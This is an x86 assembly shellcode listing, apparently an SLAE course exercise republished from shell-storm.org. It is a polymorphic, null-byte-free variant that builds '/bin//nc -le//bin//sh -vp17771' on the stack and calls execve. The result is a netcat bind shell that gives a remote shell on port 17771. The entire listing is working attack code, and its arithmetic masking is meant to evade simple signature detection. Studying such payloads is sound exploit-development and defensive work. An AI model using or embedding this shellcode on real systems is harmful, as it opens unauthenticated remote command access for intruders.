; http://shell-storm.org/shellcode/files/shellcode-872.php
; Author: Nipun Jaswal (SLAE-1080)
global _start
section .text
 _start:
;   xor eax, eax
    xor edx, edx	; Cleared EDX
    mul edx		; Cleared EAX

;   push eax
    push edx		; EDX is Also Zero

    mov esi, 0x30363636	; Instead of PUSH moved a Value to ESI
    add esi, 0x01010101 ; Addition Operation to Get the Same Value i.e. 0x31373737
    push esi		; Push Op
    add esi, 0x21010101 ; Adding Random Value to ESI (Avoiding Null)
    sub esi, 0x20c7c20b ; Getting Back the Same Value i.e. 0x3170762d
    push esi		; Push Op
;   push 0x31373737
;   push 0x3170762d
    mov esi, esp	; Moving ESP to ESI

;   push eax
    push edx		; EDX is also Zero

    mov edi, 0x68732f30	; Incremented Value to EDI
    dec edi		; Decrement the Value
    push edi		; Push EDI
    inc edi		; Incremented Again( Avoiding Null Byte)
    add edi, 0x05F632FF	; Same as 0x6e69622f (Adjusting the Value For Next Push)
    push edi 		; Value Pushed
;   push 0x68732f2f     ;-le//bin//sh
;   push 0x6e69622f
    push 0x2f656c2d	; -le/ remains unmasked
    mov edi, esp

;   push eax
    push edx		; EDX is same as EAX
    mov edx,0x636e2f2e	; Decremented Value of EDX
    inc edx		; Increment EDX
    push edx		; Push EDX
;   push 0x636e2f2f     ;/bin//nc
    
    dec edx		; Back to the Original Value for Null Free OP
    add edx, 0xafb3301	; Add Value to EDX
    push edx
;   push 0x6e69622f

    mov ebx, esp
    xor edx,edx		; Since we Used EDX above, Zeroing it Out Here
    push eax
    push esi
    push edi
    push ebx
    mov ecx, esp
;   mov al,11
    mov al,12		; Incremented
    dec eax		; Decrement
    int 0x80
